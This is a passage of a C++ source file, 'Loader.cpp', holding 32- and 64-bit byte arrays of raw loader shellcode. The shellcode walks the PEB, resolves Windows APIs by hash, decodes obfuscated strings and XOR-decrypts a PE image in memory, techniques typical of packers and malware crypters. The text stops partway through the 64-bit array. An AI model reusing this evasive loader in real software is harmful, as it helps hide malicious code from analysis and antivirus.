// Loader.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <iostream>

#include "pch.h"
#include "pefile.h"

uint8_t loader32[] =
{
 0xEA,0x00,0x00,0x00,
  0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x24, 0x8B, 0x45, 0x08, 0x89,
  0x45, 0xF4, 0x8B, 0x4D, 0xF4, 0x8B, 0x55, 0x08, 0x03, 0x51,
  0x3C, 0x89, 0x55, 0xF0, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x6B,
  0xC8, 0x00, 0x8B, 0x55, 0xF0, 0x8B, 0x45, 0x08, 0x03, 0x44,
  0x0A, 0x78, 0x89, 0x45, 0xF8, 0x8B, 0x4D, 0xF8, 0x8B, 0x55,
  0x08, 0x03, 0x51, 0x1C, 0x89, 0x55, 0xDC, 0x8B, 0x45, 0xF8,
  0x8B, 0x4D, 0x08, 0x03, 0x48, 0x20, 0x89, 0x4D, 0xE8, 0x8B,
  0x55, 0xF8, 0x8B, 0x42, 0x18, 0x89, 0x45, 0xEC, 0x8B, 0x4D,
  0xF8, 0x8B, 0x55, 0x08, 0x03, 0x51, 0x24, 0x89, 0x55, 0xE0,
  0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B,
  0x45, 0xFC, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xFC, 0x8B, 0x4D,
  0xFC, 0x3B, 0x4D, 0xEC, 0x73, 0x39, 0x8B, 0x55, 0xFC, 0x8B,
  0x45, 0xE8, 0x8B, 0x0C, 0x90, 0x03, 0x4D, 0x08, 0x89, 0x4D,
  0xE4, 0x8B, 0x55, 0xE4, 0x52, 0xE8, 0x34, 0x00, 0x00, 0x00,
  0x83, 0xC4, 0x04, 0x3B, 0x45, 0x0C, 0x75, 0x17, 0x8B, 0x45,
  0xFC, 0x8B, 0x4D, 0xE0, 0x0F, 0xB7, 0x14, 0x41, 0x8B, 0x45,
  0xDC, 0x8B, 0x4D, 0x08, 0x03, 0x0C, 0x90, 0x8B, 0xC1, 0xEB,
  0x04, 0xEB, 0xB6, 0x33, 0xC0, 0x8B, 0xE5, 0x5D, 0xC3, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0x56, 0x57, 0x8B, 0x74, 0x24, 0x0C, 0x33, 0xFF,
  0xFC, 0x33, 0xC0, 0xAC, 0x3A, 0xC4, 0x74, 0x07, 0xC1, 0xCF,
  0x0D, 0x03, 0xF8, 0xEB, 0xF2, 0x8B, 0xC7, 0x5F, 0x5E, 0xC3,
  0xCC, 0xCC, 0xCC, 0xCC, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x80,
  0x04, 0x00, 0x00, 0x53, 0x56, 0xC6, 0x45, 0xD4, 0xA3, 0xC6,
  0x45, 0xD5, 0x8F, 0xC6, 0x45, 0xD6, 0xB7, 0xC6, 0x45, 0xD7,
  0xA3, 0xC6, 0x45, 0xD8, 0x9B, 0xC6, 0x45, 0xD9, 0xB3, 0xC6,
  0x45, 0xDA, 0xDA, 0xC6, 0x45, 0xDB, 0xA2, 0xC6, 0x45, 0xDC,
  0x8E, 0xC6, 0x45, 0xDD, 0xA3, 0xC6, 0x45, 0xDE, 0x8F, 0xC6,
  0x45, 0xDF, 0x8B, 0xC6, 0x45, 0xE0, 0xC5, 0x8B, 0x45, 0x08,
  0xB9, 0x08, 0x00, 0x00, 0x00, 0xD1, 0xE1, 0x8B, 0x55, 0x0C,
  0x03, 0x04, 0x0A, 0x89, 0x45, 0xCC, 0xB8, 0x08, 0x00, 0x00,
  0x00, 0x6B, 0xC8, 0x03, 0x8B, 0x55, 0x0C, 0x8B, 0x04, 0x0A,
  0x89, 0x45, 0xC0, 0x68, 0x8E, 0x4E, 0x0E, 0xEC, 0xE8, 0xC3,
  0x03, 0x00, 0x00, 0x50, 0xE8, 0xAD, 0xFE, 0xFF, 0xFF, 0x83,
  0xC4, 0x08, 0x89, 0x45, 0xC8, 0x83, 0x7D, 0xC8, 0x00, 0x75,
  0x16, 0x68, 0x8E, 0x4E, 0x0E, 0xEC, 0xE8, 0x87, 0x03, 0x00,
  0x00, 0x50, 0xE8, 0x91, 0xFE, 0xFF, 0xFF, 0x83, 0xC4, 0x08,
  0x89, 0x45, 0xC8, 0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00,
  0xEB, 0x09, 0x8B, 0x4D, 0xF8, 0x83, 0xC1, 0x01, 0x89, 0x4D,
  0xF8, 0x83, 0x7D, 0xF8, 0x0D, 0x73, 0x27, 0x8B, 0x55, 0xF8,
  0x0F, 0xB6, 0x44, 0x15, 0xD4, 0xC1, 0xF8, 0x02, 0x8B, 0x4D,
  0xF8, 0x0F, 0xB6, 0x54, 0x0D, 0xD4, 0xC1, 0xE2, 0x06, 0x0B,
  0xC2, 0x33, 0x45, 0xF8, 0x83, 0xE8, 0x7D, 0x8B, 0x4D, 0xF8,
  0x88, 0x44, 0x0D, 0xD4, 0xEB, 0xCA, 0x8D, 0x55, 0xD4, 0x52,
  0xFF, 0x55, 0xC8, 0x89, 0x45, 0xE8, 0x68, 0xA5, 0x17, 0x00,
  0x7C, 0x8B, 0x45, 0xE8, 0x50, 0xE8, 0x34, 0xFE, 0xFF, 0xFF,
  0x83, 0xC4, 0x08, 0x89, 0x45, 0xA0, 0xB9, 0x08, 0x00, 0x00,
  0x00, 0xC1, 0xE1, 0x03, 0x03, 0x4D, 0x0C, 0x89, 0x4D, 0xE4,
  0xC7, 0x45, 0xEC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B,
  0x55, 0xEC, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xEC, 0x8B, 0x45,
  0xE4, 0x03, 0x45, 0xEC, 0x0F, 0xB6, 0x08, 0x85, 0xC9, 0x74,
  0x15, 0x8B, 0x55, 0xE4, 0x03, 0x55, 0xEC, 0x0F, 0xB6, 0x02,
  0xF7, 0xD0, 0x8B, 0x4D, 0xE4, 0x03, 0x4D, 0xEC, 0x88, 0x01,
  0xEB, 0xD5, 0x6A, 0x00, 0x68, 0x80, 0x00, 0x00, 0x00, 0x6A,
  0x03, 0x6A, 0x00, 0x6A, 0x01, 0x68, 0x00, 0x00, 0x00, 0x10,
  0x8B, 0x55, 0xE4, 0x52, 0xFF, 0x55, 0xA0, 0x89, 0x45, 0xC4,
  0x83, 0x7D, 0xC4, 0xFF, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0x80,
  0x02, 0x00, 0x00, 0x68, 0x16, 0x65, 0xFA, 0x10, 0x8B, 0x45,
  0xE8, 0x50, 0xE8, 0xB5, 0xFD, 0xFF, 0xFF, 0x83, 0xC4, 0x08,
  0x89, 0x45, 0x98, 0xC7, 0x45, 0xD0, 0x00, 0x00, 0x00, 0x00,
  0xEB, 0x09, 0x8B, 0x4D, 0xD0, 0x83, 0xC1, 0x01, 0x89, 0x4D,
  0xD0, 0x81, 0x7D, 0xD0, 0x00, 0x04, 0x00, 0x00, 0x7D, 0x0D,
  0x8B, 0x55, 0xD0, 0xC6, 0x84, 0x15, 0x80, 0xFB, 0xFF, 0xFF,
  0x00, 0xEB, 0xE1, 0xC7, 0x45, 0x9C, 0x00, 0x00, 0x00, 0x00,
  0x6A, 0x00, 0x8D, 0x45, 0x9C, 0x50, 0x68, 0x00, 0x04, 0x00,
  0x00, 0x8D, 0x8D, 0x80, 0xFB, 0xFF, 0xFF, 0x51, 0x8B, 0x55,
  0xC4, 0x52, 0xFF, 0x55, 0x98, 0x68, 0xFB, 0x97, 0xFD, 0x0F,
  0x8B, 0x45, 0xE8, 0x50, 0xE8, 0x59, 0xFD, 0xFF, 0xFF, 0x83,
  0xC4, 0x08, 0x89, 0x45, 0x94, 0x8B, 0x4D, 0xC4, 0x51, 0xFF,
  0x55, 0x94, 0x68, 0x1B, 0xC6, 0x46, 0x79, 0x8B, 0x55, 0xE8,
  0x52, 0xE8, 0x3E, 0xFD, 0xFF, 0xFF, 0x83, 0xC4, 0x08, 0x89,
  0x45, 0xB0, 0xC7, 0x45, 0xB4, 0x00, 0x00, 0x00, 0x00, 0x8D,
  0x45, 0xB4, 0x50, 0x6A, 0x40, 0x0F, 0xB7, 0x4D, 0xC0, 0x51,
  0x8B, 0x55, 0xCC, 0x52, 0xFF, 0x55, 0xB0, 0xB8, 0x08, 0x00,
  0x00, 0x00, 0xC1, 0xE0, 0x02, 0x8B, 0x8D, 0x80, 0xFB, 0xFF,
  0xFF, 0x8B, 0x55, 0x0C, 0x33, 0x0C, 0x02, 0x89, 0x4D, 0x90,
  0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B,
  0x45, 0xF4, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xF4, 0x8B, 0x4D,
  0xF4, 0x3B, 0x4D, 0xC0, 0x73, 0x2B, 0x8B, 0x55, 0xCC, 0x03,
  0x55, 0xF4, 0x0F, 0xB6, 0x1A, 0x8B, 0x45, 0xF4, 0x50, 0x8B,
  0x4D, 0x90, 0x51, 0xE8, 0xA8, 0x01, 0x00, 0x00, 0x83, 0xC4,
  0x08, 0x03, 0x45, 0xF4, 0x0F, 0xB6, 0xD0, 0x33, 0xDA, 0x8B,
  0x45, 0xCC, 0x03, 0x45, 0xF4, 0x88, 0x18, 0xEB, 0xC4, 0x6A,
  0x00, 0x8B, 0x4D, 0xB4, 0x51, 0x0F, 0xB7, 0x55, 0xC0, 0x52,
  0x8B, 0x45, 0xCC, 0x50, 0xFF, 0x55, 0xB0, 0xB9, 0x08, 0x00,
  0x00, 0x00, 0x6B, 0xD1, 0x07, 0x8B, 0x45, 0x0C, 0x89, 0x45,
  0xA8, 0x89, 0x55, 0xAC, 0x8B, 0x4D, 0xAC, 0x8B, 0x55, 0xA8,
  0x8B, 0x45, 0xAC, 0x8B, 0x75, 0xA8, 0x8B, 0x0C, 0x0A, 0x0B,
  0x4C, 0x06, 0x04, 0x74, 0x1B, 0x68, 0x25, 0xB0, 0xFF, 0xC2,
  0x8B, 0x55, 0xE8, 0x52, 0xE8, 0x7D, 0xFC, 0xFF, 0xFF, 0x83,
  0xC4, 0x08, 0x89, 0x45, 0x8C, 0x8B, 0x45, 0xE4, 0x50, 0xFF,
  0x55, 0x8C, 0x8B, 0x4D, 0x08, 0x89, 0x4D, 0x88, 0x8B, 0x55,
  0x88, 0x8B, 0x45, 0x08, 0x03, 0x42, 0x3C, 0x89, 0x45, 0xBC,
  0xB9, 0x08, 0x00, 0x00, 0x00, 0x6B, 0xD1, 0x05, 0x8B, 0x45,
  0xBC, 0x83, 0x7C, 0x10, 0x78, 0x00, 0x0F, 0x86, 0xF4, 0x00,
  0x00, 0x00, 0xB9, 0x08, 0x00, 0x00, 0x00, 0x6B, 0xD1, 0x05,
  0x8B, 0x45, 0xBC, 0x83, 0x7C, 0x10, 0x7C, 0x00, 0x0F, 0x86,
  0xDE, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0x08, 0xBA, 0x08, 0x00,
  0x00, 0x00, 0x6B, 0xC2, 0x06, 0x8B, 0x55, 0x0C, 0x2B, 0x0C,
  0x02, 0x89, 0x4D, 0x80, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x6B,
  0xC8, 0x05, 0x8B, 0x55, 0xBC, 0x8B, 0x45, 0x08, 0x03, 0x44,
  0x0A, 0x78, 0x89, 0x45, 0xFC, 0x8B, 0x4D, 0xFC, 0x8B, 0x11,
  0x8B, 0x45, 0xFC, 0x03, 0x50, 0x04, 0x0F, 0x84, 0xA4, 0x00,
  0x00, 0x00, 0x8B, 0x4D, 0xFC, 0x83, 0xC1, 0x08, 0x89, 0x4D,
  0xB8, 0x8B, 0x55, 0xFC, 0x8B, 0x42, 0x04, 0x83, 0xE8, 0x08,
  0xD1, 0xE8, 0x89, 0x45, 0x84, 0xC7, 0x45, 0xF0, 0x00, 0x00,
  0x00, 0x00, 0xEB, 0x09, 0x8B, 0x4D, 0xF0, 0x83, 0xC1, 0x01,
  0x89, 0x4D, 0xF0, 0x8B, 0x55, 0xF0, 0x3B, 0x55, 0x84, 0x7D,
  0x62, 0x8B, 0x45, 0xF0, 0x8B, 0x4D, 0xB8, 0x0F, 0xB7, 0x14,
  0x41, 0x81, 0xE2, 0x00, 0xF0, 0x00, 0x00, 0x81, 0xFA, 0x00,
  0x30, 0x00, 0x00, 0x74, 0x18, 0x8B, 0x45, 0xF0, 0x8B, 0x4D,
  0xB8, 0x0F, 0xB7, 0x14, 0x41, 0x81, 0xE2, 0x00, 0xF0, 0x00,
  0x00, 0x81, 0xFA, 0x00, 0xA0, 0x00, 0x00, 0x75, 0x30, 0x8B,
  0x45, 0xFC, 0x8B, 0x4D, 0x08, 0x03, 0x08, 0x8B, 0x55, 0xF0,
  0x8B, 0x45, 0xB8, 0x0F, 0xB7, 0x14, 0x50, 0x81, 0xE2, 0xFF,
  0x0F, 0x00, 0x00, 0x03, 0xCA, 0x89, 0x4D, 0xA4, 0x8B, 0x45,
  0xA4, 0x8B, 0x08, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x03,
  0x4D, 0x08, 0x8B, 0x55, 0xA4, 0x89, 0x0A, 0xEB, 0x8D, 0x8B,
  0x45, 0xFC, 0x8B, 0x4D, 0xFC, 0x03, 0x48, 0x04, 0x89, 0x4D,
  0xFC, 0xE9, 0x4B, 0xFF, 0xFF, 0xFF, 0x8B, 0x45, 0x08, 0xBA,
  0x08, 0x00, 0x00, 0x00, 0x6B, 0xCA, 0x05, 0x8B, 0x55, 0x0C,
  0x03, 0x04, 0x0A, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0x55, 0x8B, 0xEC, 0x8B, 0x45, 0x08, 0x8B, 0x4D,
  0x0C, 0xD3, 0xE0, 0xB9, 0x20, 0x00, 0x00, 0x00, 0x2B, 0x4D,
  0x0C, 0x8B, 0x55, 0x08, 0xD3, 0xFA, 0x0B, 0xC2, 0x5D, 0xC3,
  0xCC, 0xCC, 0xCC, 0xCC, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,
  0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x8B, 0x00, 0x8B, 0x00,
  0x8B, 0x40, 0x10, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x56, 0x33, 0xC0, 0x64,
  0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70,
  0x1C, 0x8B, 0x06, 0x8B, 0x40, 0x08, 0x5E, 0xC3, 0xCC, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x58, 0x50,
  0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0x55
};

uint8_t loader64[] =
{
  0x47,0x01,0x00,0x00,
  0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48,
  0x83, 0xEC, 0x78, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00,
  0x00, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24,
  0x38, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8C, 0x24, 0x80,
  0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
  0x89, 0x44, 0x24, 0x40, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48,
  0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x84,
  0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80,
  0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
  0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B,
  0x40, 0x1C, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
  0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
  0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48,
  0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8,
  0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B,
  0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x89, 0x44, 0x24, 0x30,
  0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24, 0x48, 0x8B,
  0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48,
  0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24,
  0x20, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24,
  0x20, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x20, 0x8B, 0x44, 0x24,
  0x30, 0x39, 0x44, 0x24, 0x20, 0x73, 0x55, 0x48, 0x63, 0x44,
  0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x8B, 0x04, 0x81,
  0x48, 0x03, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89,
  0x44, 0x24, 0x50, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xE8, 0xE6,
  0x06, 0x00, 0x00, 0x3B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00,
  0x75, 0x26, 0x48, 0x63, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C,
  0x24, 0x58, 0x0F, 0xB7, 0x04, 0x41, 0x48, 0x8B, 0x4C, 0x24,
  0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
  0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x04,
  0xEB, 0x97, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78, 0xC3, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08,
  0x48, 0x81, 0xEC, 0x48, 0x05, 0x00, 0x00, 0xC6, 0x44, 0x24,
  0x50, 0xA3, 0xC6, 0x44, 0x24, 0x51, 0x8F, 0xC6, 0x44, 0x24,
  0x52, 0xB7, 0xC6, 0x44, 0x24, 0x53, 0xA3, 0xC6, 0x44, 0x24,
  0x54, 0x9B, 0xC6, 0x44, 0x24, 0x55, 0xB3, 0xC6, 0x44, 0x24,
  0x56, 0xDA, 0xC6, 0x44, 0x24, 0x57, 0xA2, 0xC6, 0x44, 0x24,
  0x58, 0x8E, 0xC6, 0x44, 0x24, 0x59, 0xA3, 0xC6, 0x44, 0x24,
  0x5A, 0x8F, 0xC6, 0x44, 0x24, 0x5B, 0x8B, 0xC6, 0x44, 0x24,
  0x5C, 0xC5, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0,
  0x02, 0x48, 0x8B, 0x8C, 0x24, 0x58, 0x05, 0x00, 0x00, 0x48,
  0x8B, 0x04, 0x01, 0x48, 0x8B, 0x8C, 0x24, 0x50, 0x05, 0x00,
  0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x84,
  0x24, 0x88, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00,
  0x48, 0x6B, 0xC0, 0x03, 0x48, 0x8B, 0x8C, 0x24, 0x58, 0x05,
  0x00, 0x00, 0x8B, 0x04, 0x01, 0x89, 0x44, 0x24, 0x70, 0xE8,
  0x46, 0x06, 0x00, 0x00, 0xBA, 0x8E, 0x4E, 0x0E, 0xEC, 0x48,
  0x8B, 0xC8, 0xE8, 0x19, 0xFE, 0xFF, 0xFF, 0x48, 0x89, 0x84,
  0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0xA0,
  0x00, 0x00, 0x00, 0x00, 0x75, 0x1A, 0xE8, 0x02, 0x06, 0x00,
  0x00, 0xBA, 0x8E, 0x4E, 0x0E, 0xEC, 0x48, 0x8B, 0xC8, 0xE8,
  0xF4, 0xFD, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xA0, 0x00,
  0x00, 0x00, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00,
  0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x40, 0xFF, 0xC0, 0x89, 0x44,
  0x24, 0x40, 0x48, 0x63, 0x44, 0x24, 0x40, 0x48, 0x83, 0xF8,
  0x0D, 0x73, 0x2E, 0x48, 0x63, 0x44, 0x24, 0x40, 0x0F, 0xB6,
  0x44, 0x04, 0x50, 0xC1, 0xF8, 0x02, 0x48, 0x63, 0x4C, 0x24,
  0x40, 0x0F, 0xB6, 0x4C, 0x0C, 0x50, 0xC1, 0xE1, 0x06, 0x0B,
  0xC1, 0x33, 0x44, 0x24, 0x40, 0x83, 0xE8, 0x7D, 0x48, 0x63,
  0x4C, 0x24, 0x40, 0x88, 0x44, 0x0C, 0x50, 0xEB, 0xBD, 0x48,
  0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84,
  0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50,
  0xFF, 0x94, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44,
  0x24, 0x78, 0xBA, 0xA5, 0x17, 0x00, 0x7C, 0x48, 0x8B, 0x4C,
  0x24, 0x78, 0xE8, 0x6F, 0xFD, 0xFF, 0xFF, 0x48, 0x89, 0x84,
  0x24, 0xD8, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00,
  0x48, 0x6B, 0xC0, 0x08, 0x48, 0x8B, 0x8C, 0x24, 0x58, 0x05,
  0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
  0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x4C,
  0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x4C,
  0xFF, 0xC0, 0x89, 0x44, 0x24, 0x4C, 0x48, 0x63, 0x44, 0x24,
  0x4C, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x0F,
  0xB6, 0x04, 0x01, 0x85, 0xC0, 0x74, 0x25, 0x48, 0x63, 0x44,
  0x24, 0x4C, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
  0x0F, 0xB6, 0x04, 0x01, 0xF7, 0xD0, 0x48, 0x63, 0x4C, 0x24,
  0x4C, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00, 0x88,
  0x04, 0x0A, 0xEB, 0xBC, 0x48, 0x8B, 0x84, 0x24, 0xD8, 0x00,
  0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xE0, 0x00, 0x00, 0x00,
  0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7,
  0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24,
  0x20, 0x03, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x41, 0xB8,
  0x01, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x10, 0x48,
  0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x94, 0x24,
  0xE0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xA8, 0x00,
  0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0xA8, 0x00, 0x00, 0x00,
  0xFF, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0x2D, 0x04, 0x00, 0x00,
  0xBA, 0x16, 0x65, 0xFA, 0x10, 0x48, 0x8B, 0x4C, 0x24, 0x78,
  0xE8, 0x8B, 0xFC, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xE8,
  0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x60, 0x00, 0x00, 0x00,
  0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x60, 0xFF, 0xC0, 0x89,
  0x44, 0x24, 0x60, 0x81, 0x7C, 0x24, 0x60, 0x00, 0x04, 0x00,
  0x00, 0x7D, 0x0F, 0x48, 0x63, 0x44, 0x24, 0x60, 0xC6, 0x84,
  0x04, 0x40, 0x01, 0x00, 0x00, 0x00, 0xEB, 0xDD, 0xC7, 0x84,
  0x24, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,
  0x8B, 0x84, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84,
  0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20,
  0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x8C, 0x24, 0x90, 0x00,
  0x00, 0x00, 0x41, 0xB8, 0x00, 0x04, 0x00, 0x00, 0x48, 0x8D,
  0x94, 0x24, 0x40, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24,
  0xA8, 0x00, 0x00, 0x00, 0xFF, 0x94, 0x24, 0xF0, 0x00, 0x00,
  0x00, 0xBA, 0xFB, 0x97, 0xFD, 0x0F, 0x48, 0x8B, 0x4C, 0x24,
  0x78, 0xE8, 0xFE, 0xFB, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24,
  0xF8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xF8, 0x00,
  0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00,
  0x48, 0x8B, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0xFF, 0x94,
  0x24, 0x00, 0x01, 0x00, 0x00, 0xBA, 0x1B, 0xC6, 0x46, 0x79,
  0x48, 0x8B, 0x4C, 0x24, 0x78, 0xE8, 0xC8, 0xFB, 0xFF, 0xFF,
  0x48, 0x89, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xC7, 0x44,
  0x24, 0x74, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24,
  0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x08, 0x01,
  0x00, 0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x74, 0x41, 0xB8, 0x40,
  0x00, 0x00, 0x00, 0x0F, 0xB7, 0x54, 0x24, 0x70, 0x48, 0x8B,
  0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0xFF, 0x94, 0x24, 0x08,
  0x01, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B,
  0xC0, 0x04, 0x8B, 0x8C, 0x24, 0x40, 0x01, 0x00, 0x00, 0x48,
  0x8B, 0x94, 0x24, 0x58, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x04,
  0x02, 0x48, 0x33, 0xC1, 0x89, 0x84, 0x24, 0x94, 0x00, 0x00,
  0x00, 0xC7, 0x44, 0x24, 0x44, 0x00, 0x00, 0x00, 0x00, 0xEB,
  0x0A, 0x8B, 0x44, 0x24, 0x44, 0xFF, 0xC0, 0x89, 0x44, 0x24,
  0x44, 0x8B, 0x44, 0x24, 0x70, 0x39, 0x44, 0x24, 0x44, 0x73,
  0x4C, 0x48, 0x63, 0x44, 0x24, 0x44, 0x48, 0x8B, 0x8C, 0x24,
  0x88, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x04, 0x01, 0x89, 0x84,
  0x24, 0x98, 0x00, 0x00, 0x00, 0x8B, 0x54, 0x24, 0x44, 0x8B,
  0x8C, 0x24, 0x94, 0x00, 0x00, 0x00, 0xE8, 0xBD, 0x02, 0x00,
  0x00, 0x03, 0x44, 0x24, 0x44, 0x0F, 0xB6, 0xC0, 0x8B, 0x8C,
  0x24, 0x98, 0x00, 0x00, 0x00, 0x33, 0xC8, 0x8B, 0xC1, 0x48,
  0x63, 0x4C, 0x24, 0x44, 0x48, 0x8B, 0x94, 0x24, 0x88, 0x00,
  0x00, 0x00, 0x88, 0x04, 0x0A, 0xEB, 0xA0, 0x48, 0x8B, 0x84,
  0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x10,
  0x01, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x44, 0x8B, 0x44, 0x24,
  0x74, 0x0F, 0xB7, 0x54, 0x24, 0x70, 0x48, 0x8B, 0x8C, 0x24,
  0x88, 0x00, 0x00, 0x00, 0xFF, 0x94, 0x24, 0x10, 0x01, 0x00,
  0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x07,
